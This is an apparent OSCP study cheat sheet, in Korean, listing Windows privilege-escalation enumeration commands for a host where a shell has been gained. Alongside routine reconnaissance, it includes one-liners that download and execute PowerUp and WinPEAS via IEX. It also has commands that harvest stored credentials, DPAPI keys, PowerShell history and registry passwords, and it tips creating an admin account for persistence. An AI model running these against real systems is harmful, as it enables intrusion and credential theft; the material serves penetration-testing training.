# Windows Privilege Escalation - Enumeration

> **OSCP 핵심**: Windows 쉘 획득 후 즉시 실행할 권한상승 정보 수집 명령어들

## ⚡ 즉시 실행할 명령어들

### 🔥 원라이너 최우선 명령어 (30초 안에 실행)

```cmd
:: 현재 사용자 및 권한 확인
whoami
whoami /priv
whoami /groups
whoami /all

:: 시스템 정보
systeminfo
hostname
echo %USERNAME%
echo %COMPUTERNAME%
```

```powershell
# PowerShell 버전
Get-WmiObject -Class Win32_OperatingSystem
Get-ComputerInfo
$env:USERNAME
$env:COMPUTERNAME
[Environment]::OSVersion
```

### 🚀 핵심 시스템 정보 (1분 안에)

```cmd
:: OS 및 패치 정보
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
wmic qfe get Description,HotFixID,InstalledOn

:: 현재 사용자 상세 정보
net user %USERNAME%
net localgroup administrators
net localgroup "Remote Desktop Users"

:: 실행 중인 프로세스
tasklist /svc
wmic process get name,processid,parentprocessid,executablepath

:: 네트워크 연결 상태
netstat -an | findstr LISTENING
netstat -an | findstr ESTABLISHED
```

### ⚡ 서비스 및 권한 확인 (즉시)

```cmd
:: 서비스 정보
sc query state= all
wmic service get name,displayname,pathname,startmode,state

:: 스케줄된 작업
schtasks /query /fo LIST /v
wmic job get name,owner,daysofweek,daysofmonth,elapsedtime,status

:: 파일 권한 (중요 디렉토리)
icacls "C:\Program Files"
icacls "C:\Program Files (x86)"
icacls C:\Windows\System32
icacls C:\Windows\Temp
```

## 📋 단계별 체크리스트

### Phase 1: 기본 정보 수집 (2-3분)

- [ ] **시스템 정보**: `systeminfo` 실행하여 OS, 패치 정보 확인
- [ ] **현재 사용자**: `whoami /all` 권한 및 그룹 확인
- [ ] **관리자 그룹**: `net localgroup administrators` 멤버 확인
- [ ] **네트워크 정보**: `ipconfig /all` 네트워크 설정 확인
- [ ] **도메인 정보**: 도메인 가입 여부 및 도메인 컨트롤러 확인

### Phase 2: 권한 및 그룹 분석 (3-5분)

- [ ] **사용자 권한**: Token privileges (SeDebug, SeImpersonate 등) 확인
- [ ] **그룹 멤버십**: 특수 그룹 가입 여부 확인
- [ ] **로컬 사용자**: `net user` 모든 로컬 사용자 나열
- [ ] **도메인 사용자**: 도메인 환경에서 도메인 사용자 정보
- [ ] **세션 정보**: 다른 사용자 로그인 세션 확인

### Phase 3: 서비스 및 소프트웨어 (3-5분)

- [ ] **실행 중인 서비스**: 권한이 잘못된 서비스들 확인
- [ ] **설치된 소프트웨어**: `wmic product get` 설치된 프로그램들
- [ ] **스케줄된 작업**: 관리자 권한으로 실행되는 작업들
- [ ] **시작 프로그램**: 자동 시작 프로그램들과 권한
- [ ] **드라이버**: 설치된 드라이버들과 버전 정보

### Phase 4: 파일시스템 및 레지스트리 (2-3분)

- [ ] **파일 권한**: Program Files, System32 등 중요 디렉토리
- [ ] **쓰기 가능 위치**: 사용자가 쓸 수 있는 디렉토리들
- [ ] **레지스트리 키**: 서비스 및 시작 프로그램 레지스트리
- [ ] **환경 변수**: PATH, PATHEXT 등 시스템 변수
- [ ] **최근 파일**: 최근 생성/수정된 파일들

## 🎯 발견별 즉시 실행 명령어

### 🔑 Token Privileges 확인

```cmd
:: 현재 사용자의 모든 권한 확인
whoami /priv

:: 중요한 권한들 개별 확인
whoami /priv | findstr "SeDebugPrivilege"
whoami /priv | findstr "SeImpersonatePrivilege"
whoami /priv | findstr "SeAssignPrimaryTokenPrivilege"
whoami /priv | findstr "SeTakeOwnershipPrivilege"
whoami /priv | findstr "SeRestorePrivilege"
whoami /priv | findstr "SeBackupPrivilege"
```

```powershell
# PowerShell로 권한 확인
Get-Process | ForEach-Object { $_.ProcessName + " - " + $_.Id }
[Security.Principal.WindowsIdentity]::GetCurrent().Groups
```

### 📁 파일 및 디렉토리 권한

```cmd
:: 중요 디렉토리들의 권한 확인
icacls "C:\Program Files" | findstr "Everyone\|Users\|Authenticated Users"
icacls "C:\Program Files (x86)" | findstr "Everyone\|Users\|Authenticated Users"
icacls "C:\Windows\System32" | findstr "Everyone\|Users\|Authenticated Users"

:: 사용자가 쓸 수 있는 디렉토리 찾기
for /f %i in ('dir /b "C:\Program Files"') do icacls "C:\Program Files\%i" | findstr "Everyone\|Users\|%USERNAME%"

:: 실행 파일의 권한 확인
icacls "C:\Windows\System32\*.exe" | findstr "Everyone\|Users"
```

```powershell
# PowerShell로 권한 확인
Get-ChildItem "C:\Program Files" | Get-Acl | Where-Object {$_.AccessToString -match "Everyone|Users"}
Get-ChildItem "C:\Program Files (x86)" | Get-Acl | Where-Object {$_.AccessToString -match "Everyone|Users"}

# 쓰기 가능한 파일 찾기
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {!$_.PSIsContainer} | Where-Object {$_.FullName -notlike "*\Windows\*"} | ForEach-Object {try {[io.file]::OpenWrite($_.FullName).close();Write-Host "Writable: $($_.FullName)" -ForegroundColor Green} catch {}}
```

### 🔧 서비스 권한 분석

```cmd
:: 모든 서비스 상세 정보
sc query state= all
wmic service get name,displayname,pathname,startmode,state,startname

:: 특정 서비스 권한 확인
sc qc "ServiceName"
sc sdshow "ServiceName"

:: 서비스 실행 파일 권한 확인
for /f "tokens=2 delims= " %i in ('sc query state= all ^| findstr "SERVICE_NAME"') do @echo %i & sc qc %i | findstr "BINARY_PATH_NAME"

:: 쓰기 가능한 서비스 실행 파일
for /f "tokens=2*" %i in ('sc query state= all ^| findstr "SERVICE_NAME"') do @for /f "tokens=3*" %k in ('sc qc %j ^| findstr "BINARY_PATH_NAME"') do @icacls %k | findstr "Everyone\|Users\|%USERNAME%"
```

```powershell
# PowerShell로 서비스 분석
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode, State, StartName

# 서비스 권한 확인
Get-WmiObject win32_service | ForEach-Object {
    $servicePath = $_.PathName -replace '"', ''
    if (Test-Path $servicePath) {
        $acl = Get-Acl $servicePath
        if ($acl.AccessToString -match "Everyone|Users") {
            Write-Host "Vulnerable service: $($_.Name) - $servicePath" -ForegroundColor Red
        }
    }
}
```

### 📅 스케줄된 작업 확인

```cmd
:: 모든 스케줄된 작업
schtasks /query /fo LIST /v | findstr "TaskName\|Run As User\|Task To Run"

:: 관리자 권한으로 실행되는 작업들
schtasks /query /fo LIST /v | findstr /C:"Run As User" /C:"SYSTEM\|Administrator"

:: 특정 작업 상세 정보
schtasks /query /tn "TaskName" /fo LIST /v

:: 작업 실행 파일의 권한 확인
for /f "tokens=*" %i in ('schtasks /query /fo csv ^| findstr /V "TaskName"') do @echo %i
```

```powershell
# PowerShell로 스케줄된 작업 확인
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*SYSTEM*" -or $_.Principal.UserId -like "*Administrator*"}

# 작업 실행 파일 권한 확인
Get-ScheduledTask | ForEach-Object {
    $action = $_.Actions | Where-Object {$_.Execute}
    if ($action -and $action.Execute) {
        $path = $action.Execute
        if (Test-Path $path) {
            $acl = Get-Acl $path
            if ($acl.AccessToString -match "Everyone|Users") {
                Write-Host "Vulnerable scheduled task: $($_.TaskName) - $path" -ForegroundColor Red
            }
        }
    }
}
```

### 🌐 네트워크 정보 수집

```cmd
:: 네트워크 설정
ipconfig /all
route print
arp -a

:: 열린 포트 및 연결
netstat -an
netstat -anb
netstat -ano | findstr LISTENING

:: 방화벽 설정
netsh firewall show config
netsh advfirewall show allprofiles

:: 네트워크 공유
net share
wmic share get name,path
```

```powershell
# PowerShell 네트워크 정보
Get-NetIPConfiguration
Get-NetRoute
Get-NetNeighbor

# 열린 포트와 프로세스
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}

# 방화벽 규칙
Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"}
```

## 🤖 자동화 도구 활용

### 🔍 WinPEAS (가장 추천)

```cmd
:: WinPEAS 다운로드 및 실행
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')"

:: 또는 실행 파일 다운로드
powershell -c "Invoke-WebRequest -Uri 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe' -OutFile 'winPEAS.exe'"
winPEAS.exe

:: 결과를 파일로 저장
winPEAS.exe > winpeas_output.txt

:: 특정 모듈만 실행 (빠른 실행)
winPEAS.exe cmd fast
```

### 🎯 PowerUp

```powershell
# PowerUp 다운로드 및 실행
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# 모든 취약점 검사
Invoke-AllChecks

# 개별 검사 실행
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
Get-ServiceUnquoted
Find-ProcessDLLHijack
Find-PathDLLHijack
```

### 🔧 SharpUp

```cmd
:: SharpUp 실행 (C# 컴파일된 버전)
SharpUp.exe

:: 또는 PowerShell에서
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs')"
```

### 🕵️ Seatbelt

```cmd
:: Seatbelt 전체 검사
Seatbelt.exe -group=all

:: 특정 검사만
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc

:: 개별 검사
Seatbelt.exe TokenPrivileges
Seatbelt.exe Services
Seatbelt.exe ProcessCreationEvents
```

### 🤖 수동 종합 스크립트

```cmd
:: 종합 정보 수집 스크립트 (복붙용)
@echo off
echo ===== WINDOWS PRIVILEGE ESCALATION ENUMERATION =====
echo.
echo [+] System Information:
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
echo.
echo [+] Current User and Privileges:
whoami /all
echo.
echo [+] Local Users:
net user
echo.
echo [+] Local Groups:
net localgroup
echo.
echo [+] Administrator Group Members:
net localgroup administrators
echo.
echo [+] Running Services:
sc query state= all | findstr "SERVICE_NAME\|STATE"
echo.
echo [+] Scheduled Tasks:
schtasks /query /fo LIST | findstr "TaskName\|Run As User"
echo.
echo [+] Network Connections:
netstat -an | findstr LISTENING
echo.
echo [+] Environment Variables:
set
echo.
echo ===== ENUMERATION COMPLETE =====
```

```powershell
# PowerShell 종합 스크립트
Write-Host "===== WINDOWS PRIVILEGE ESCALATION ENUMERATION =====" -ForegroundColor Green

Write-Host "`n[+] System Information:" -ForegroundColor Yellow
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, WindowsBuildLabEx

Write-Host "`n[+] Current User and Privileges:" -ForegroundColor Yellow
whoami /all

Write-Host "`n[+] Local Users:" -ForegroundColor Yellow
Get-LocalUser

Write-Host "`n[+] Local Groups:" -ForegroundColor Yellow
Get-LocalGroup

Write-Host "`n[+] Running Services:" -ForegroundColor Yellow
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName

Write-Host "`n[+] Scheduled Tasks:" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath

Write-Host "`n[+] Network Connections:" -ForegroundColor Yellow
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"} | Select-Object LocalAddress, LocalPort, OwningProcess

Write-Host "`n===== ENUMERATION COMPLETE =====" -ForegroundColor Green
```

## 👀 놓치기 쉬운 것들

### 🚨 자주 놓치는 체크포인트

```cmd
:: 1. 레지스트리 자동 시작 프로그램들
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

:: 2. 서비스 레지스트리 키들
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

:: 3. 알려진 DLL 하이재킹 위치들
dir "C:\Windows\System32" | findstr "\.dll$"
dir "C:\Windows\SysWOW64" | findstr "\.dll$"

:: 4. Unquoted service path 확인
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: 5. AlwaysInstallElevated 레지스트리 설정
reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

:: 6. 저장된 자격 증명
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr

:: 7. Windows 자격 증명 관리자
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials"

:: 8. DPAPI 마스터 키들
dir /a %APPDATA%\Microsoft\Protect\
dir /a %LOCALAPPDATA%\Microsoft\Protect\

:: 9. 최근 실행된 명령어들 (PowerShell 히스토리)
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: 10. IIS 설정 파일 (웹 서버 있는 경우)
type C:\inetpub\wwwroot\web.config
dir /b /s C:\inetpub\ | findstr web.config
```

### 🔍 PowerShell을 이용한 고급 열거

```powershell
# 1. .NET 버전 확인 (일부 익스플로잇에 필요)
Get-ChildItem 'HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version -EA 0 | Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} | Select-Object PSChildName, Version

# 2. PowerShell 실행 정책
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# 3. PowerShell 모듈 경로
$env:PSModulePath -split ';'

# 4. 환경 변수에서 패스워드 찾기
Get-ChildItem Env: | Where-Object {$_.Name -like "*PASS*" -or $_.Name -like "*PWD*" -or $_.Value -like "*password*"}

# 5. 최근 파일들 (24시간 이내)
Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-1)} | Select-Object FullName, CreationTime | Sort-Object CreationTime -Descending

# 6. 숨겨진 파일들
Get-ChildItem -Path C:\ -Recurse -Hidden -ErrorAction SilentlyContinue | Select-Object FullName

# 7. 대용량 파일들 (100MB 이상)
Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Length -gt 100MB} | Select-Object FullName, @{Name="Size(MB)";Expression={[math]::Round($_.Length/1MB,2)}}

# 8. 실행 파일들 중 System32 외부에 있는 것들
Get-ChildItem -Path C:\ -Recurse -Include *.exe -ErrorAction SilentlyContinue | Where-Object {$_.FullName -notlike "*Windows\System32*" -and $_.FullName -notlike "*Windows\SysWOW64*"} | Select-Object FullName

# 9. 레지스트리에서 패스워드 검색
Get-ChildItem -Path HKLM:\ -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue | Where-Object {$_ -match "password"}
    } catch {}
}

# 10. Windows Defender 제외 목록
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess
```

### ⚡ 응급상황 빠른 체크 (막혔을 때)

```cmd
:: 모든 것이 안될 때 마지막 시도들
echo 1. Checking for writable system directories...
icacls "C:\Windows\System32" | findstr "Everyone\|Users\|%USERNAME%"
icacls "C:\Windows\Temp" | findstr "Everyone\|Users\|%USERNAME%"

echo 2. Checking for unquoted service paths...
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

echo 3. Checking for AlwaysInstallElevated...
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

echo 4. Checking for stored credentials...
cmdkey /list

echo 5. Checking for service permissions...
accesschk.exe -uwcqv "Authenticated Users" * 2>nul

echo 6. Checking for modifiable services...
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> C:\temp\permissions.txt & @icacls %a 2>nul | findstr "Everyone\|Users\|Authenticated Users" && @echo. && @echo.

echo 7. Checking current privileges...
whoami /priv | findstr "Se.*Privilege"

echo 8. Checking for weak folder permissions in Program Files...
icacls "C:\Program Files\*" 2>nul | findstr "Everyone\|Users" | findstr "F\|M\|W"

echo 9. Checking for passwords in registry...
reg query HKLM /f password /t REG_SZ /s | findstr "password"

echo 10. Checking for auto-logon credentials...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr "DefaultUserName\|DefaultPassword"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 3분**: 기본 시스템 정보 및 사용자 권한 확인
- **다음 5분**: 서비스, 스케줄된 작업, 파일 권한 분석
- **추가 2분**: 자동화 도구 (WinPEAS) 실행
- **10분 후**: 여전히 방법이 없으면 다른 벡터나 머신 고려

### 🎯 우선순위

1. **Token Privileges** (SeDebug, SeImpersonate 등 - 즉시 확인)
2. **Unquoted Service Path** (가장 흔한 Windows privesc)
3. **Service Permissions** (서비스 실행 파일 수정 가능)
4. **AlwaysInstallElevated** (MSI 패키지로 즉시 SYSTEM)
5. **Scheduled Tasks** (관리자 권한 작업의 실행 파일 수정)

### 🔥 즉시 시도할 것들

- WinPEAS 실행과 동시에 `whoami /priv` 체크
- Unquoted service path는 가장 흔하므로 우선 확인
- AlwaysInstallElevated 레지스트리 키 즉시 확인
- Program Files 디렉토리 권한 확인

### 💡 팁

- Windows는 Linux보다 자동화 도구 의존도가 높음
- PowerShell과 CMD 명령어를 모두 활용
- 레지스트리는 Windows 권한상승의 핵심
- 서비스와 스케줄된 작업이 가장 흔한 벡터
- 성공시 즉시 지속성 확보 (새 관리자 계정 생성 등)
